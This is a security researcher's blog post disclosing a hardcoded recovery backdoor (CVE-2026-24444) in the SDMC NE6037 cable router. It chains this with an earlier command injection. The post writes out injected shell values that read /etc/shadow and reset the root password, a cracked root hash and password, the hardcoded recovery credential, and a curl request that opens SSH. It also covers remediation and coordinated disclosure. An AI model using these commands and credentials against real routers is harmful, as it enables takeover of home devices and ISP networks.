---
layout: post
title: "Recovering the rooter: SDMC NE6037 CVE-2026-24444"
date: 2026-05-28 00:12 +0200
description: "Exploiting SDMC NE6037 Router Recovery Backdoor to obtain root access"
categories: [Vulnerability Research]
tags: [SDMC, NE6037, vulnerability-research, CVE-2026-24444]
---

# Intro

During December 2025, I had to temporarily move to a different apartment due to renovations in my own. I spent most of the winter looking for potential targets to research and chose Windows Server Update Services (found a lame DoS, maybe I'll post about it) as it was affected by some RCE vulnerabilities in 2025 and is a juicy target.

While I was preparing the lab environment, I noticed some Internet connectivity issues. I thought that it was the usual DHCP renewal every 24 hours enforced by the ISP, but then I realized that actually my wireless NIC was reconnecting to the router. OK, maybe some maintenance by the ISP? But the same dang thing started to happen more often, and I was getting irritated. So, how to fix this? Well, let's pwn the device!

What is SDMC NE6037? As stated on the [official](https://en.sdmctech.com/product/DOCSIS_234.html) site, _NE6037 is a superior cable gateway that unifies a DOCSIS 3.1 cable modem, router, voice, and wireless AP into one efficient device. NE6037 boasts a gigabit network interface and supports 2.4G and 5G wireless networks, allowing a wireless transmission rate of up to 6000Mbps. Rich in software features, this Wi-Fi6 product elevates the online experience for enterprises and households._

Superior, efficient and rich in software features. Sounds good.

# Initial exploitation via a previously-known vulnerability (CVE-2025-8890)

Poking around the router's web interface and searching for known vulnerabilities I realized that the router does not have the latest firmware installed and that the currently present firmware should be vulnerable to a command injection in the network diagnostics tool. I forgot to take screenshots, so I am going to link the ones from the original Securitum [blog post](https://www.securitum.com/cve-2025-8890.html). 

![Securitum research on CVE-2025-8890](https://www.securitum.com/images/Zrzut-ekranu-2025-12-18-153628.png)

A straight-forward command injection vulnerability in firmware versions < 7.1.12.2.44. Additional information can be found at:
- [https://www.securitum.com/cve-2025-8890.html](https://www.securitum.com/cve-2025-8890.html)
- [https://cert.pl/en/posts/2025/11/CVE-2025-8890/](https://cert.pl/en/posts/2025/11/CVE-2025-8890/)
- [https://nvd.nist.gov/vuln/detail/CVE-2025-8890](https://nvd.nist.gov/vuln/detail/CVE-2025-8890)

And if you are wondering - the binary was running as root and you can get a root shell with usual reverse-shell payloads, but I wanted to obtain console access to the device. 

Neither SSH nor Telnet were network-accessible, so I poked around, looked at the `iptables` output and saw that there is a firewall rule that disallows SSH access. As I can execute commands as the root user, I've opted for `';iptables -D lan2self_mgmt -p tcp --dport 22 -j DROP'` to allow access to TCP port 22 from the LAN interface. 

SSH was now accessible, so the next step was to obtain the root password hash via `';cat /etc/shadow'`.

```bash
root:$6$0OSd5XYncb/fI$5tdg8kOFc27q2tBujKoa7CnhSNG4N0KrUgIZ93xjDRiyimo1Mj46kcfPnt2krrGZNM08SaF/0r2rNMvKDW2e7/
```

I then went and changed the root password with: `';echo -e pw123\\npw123 | passwd root'` via the command injection vulnerability, which allowed me to access the device via SSH.

![Root access to the SDMC NE6037](/assets/img/7/sdmc-root-access.png)

I left the original root password hash cracking in the background.

# Recovery backdoor in mgmt.php (CVE-2026-24444)

I don't like authentication as a prerequisite for an exploit. As I had root access, I decided to look at the source code of the management web interface and found it in `/usr/www`:

```bash
➜  www ls
cgi-bin            css                fonts              i18n               index.htm          login.htm          upload
CSRF-Protector-PHP favicon.ico        html               images             js                 php
```

_Quick routing note before we dive in: hitting `/cgi-bin/recovery.php` actually executes `handleConsoleRecovery` in `mgmt.php`. The framework gets you there in two hops as the `recovery.php` is registered in `getCgiPublicUrls()` (so no token is required, the request is auto-granted admin), and it's mapped to `handleConsoleRecovery` via `DECL_BYPASS("recovery.php", "handleConsoleRecovery")` in `php/lib/handler.php`. That's why the PoC hits `recovery.php` while the analysis below focuses on `mgmt.php`._

I used `grep` to find some hardcoded passwords, hoping to find some low-hanging fruit. And wouldn't you know it:

![Hardcoded password](/assets/img/7/sdmc-hardcoded-recovery-password.png)

Looking at `mgmt.php`, at line 729 we see the definition of the `handleConsoleRecovery` function. The function, among other things, sets the `code` variable to `success`, and obtains username and password from the HTTP request query by using the `utilsGetQueryString` function, at lines 737 and 738.

![Handlerecovery function](/assets/img/7/sdmc-handlerecovery-function-mgmt-php.png)

If the password matches the hardcoded value `YzVlY2UxMDc4MmEzYjYzNDM3OTY5NzkyYWQ1YWM2MGEK`, the `code` variable will stay set as `success` (as defined earlier on line 731), and allow us to enter the `if` block at line 764.

![Handlerecovery function](/assets/img/7/sdmc-handlerecovery-function-mgmt-php-2.png)

If `$code === "success"`, modification of the router configuration is possible either via the `cgiScalarSetConfig` function or via the PHP's beloved `exec()` function which executes `iptables` and `ip6tables` (as can be seen on lines 778-781) which will insert a firewall rule that will allow access to SSH / Telnet from the LAN interface:

![Handlerecovery function](/assets/img/7/sdmc-handlerecovery-function-mgmt-php-3.png)

PoC or GTFO:
![Backdoor Poc](/assets/img/7/sdmc-backdoor-poc.png)

## Chaining recovery backdoor to obtain root access

In the meantime, my dear friend John the Ripper did his job and ripped the SHA512 root password hash:

```bash
➜  john root-hash.txt --wordlist=wl.txt --rule=jumbo
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX-512 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 32 OpenMP threads
Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 2 candidates buffered, minimum 256 needed for performance.
1qaz@WSX         (root)
1g 0:00:00:00 DONE (2025-12-16 17:58) 20.00g/s 40.00p/s 40.00c/s 40.00C/s jS8xuvy..1qaz@WSX
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

To confirm, I reverted the router to factory settings and once again repeated the following steps:

- sent an HTTP request to the router’s web interface which will enable SSH and Telnet access via the backdoored credentials with: `curl -Lknv 'http://192.168.0.1/cgi-bin/recovery.php?username=admin&password=YzVlY2UxMDc4MmEzYjYzNDM3OTY5NzkyYWQ1YWM2MGEK&commit=false'`
- SSH'd as `root` with password `1qaz@WSX`

Exploitation video:
<video width="100%" controls>
  <source src="/assets/img/7/CVE-2026-24444.mp4" type="video/mp4">
</video>

PoC for the specific firmware version can be found [here](/assets/pocs/CVE-2026-24444.py).

## Remediation

Never expose the management web interfaces to the Internet. Or any other service from your router, without at least some IP whitelisting.

The problem is - not only someone can use your router as a pivot point to your network, but can use it to attack the ISP's backend infrastructure. I will omit the specific information, but the router that I exploited had eight network interfaces with IP addresses in different private IP ranges. Only one was my local LAN, and the others are probably the ISP's internal / backend networks. This way you can help your ISP so that it doesn't get owned.

For the ISPs - please patch routers to their latest firmware versions. Not only that protects your customers, but your infrastructure as well.

Most commonly, ISPs put CPE devices behind a [CGNAT](https://en.wikipedia.org/wiki/Carrier-grade_NAT) to reduce IPv4 public address consumption, so you are _somewhat_ protected. But users can opt-out of this at any time ("I need it for my job").

If you notice that the router you own does not have the latest firmware, best thing to do is contact the ISP and request them to apply it. 

Or you can fix your own router by exploiting it and changing the root password (just ask the ISP for permission :P).

## References

- **CVE-2026-24444** - [https://www.vulncheck.com/advisories/sdmc-ne6037-hardcoded-password-via-mgmt-php-npcmd-php](https://www.vulncheck.com/advisories/sdmc-ne6037-hardcoded-password-via-mgmt-php-npcmd-php)

# Outro

The firmware on my device was an older branch than the one Securitum analyzed for CVE-2025-8890. That command injection was patched in 7.1.12.2.44, but my older build still had it, which is what gave me a foothold to start looking at the recovery backdoor in the first place.

The recovery backdoor (CVE-2026-24444) is a separate issue, and unfortunately I never managed to obtain a 7.1.12.x image myself to confirm whether it persists in the branch that fixed the command injection. That left a slightly bitter aftertaste, but I'm still glad the research helped push firmware upgrades out to the ISP's customer routers.

I would like to thank the guys from the Internet Service Provider security and device team for great collaboration. They tested the vulnerability internally and confirmed that the backdoor was still present in a slightly newer build than the one currently deployed on the routers, just with a changed root password. They also rolled out an update to all client routers in a very short time.

I reached out to SDMC myself and also reported the vulnerability to the ISP and VulnCheck. While SDMC never replied to VulnCheck or me, the guys from the ISP had success. SDMC said they would make some major changes:
- remove the SSH/Telnet backdoor (you don't say?)
- assign a unique root password per device
- add an ERP certification feature (tbh, I don't know what that is. Exclude Recovery Password?)

By promising to remove the backdoor and assign per-device passwords, SDMC implicitly admitted both that it exists and that every device currently ships with the same hardcoded root credentials even on latest firmware versions.

Props to VulnCheck for handling the communication and constantly pinging SDMC for follow-up. Per their [disclosure policy](https://www.vulncheck.com/vulnerability-disclosure-policy), the vendor has 120 days from the time of outreach to address the issue before public disclosure by the CVD parties. For this vulnerability, that 120-day deadline falls on May 28, 2026 (today), so hopefully you enjoyed this blog post.

Recover the planet!

kr3bz
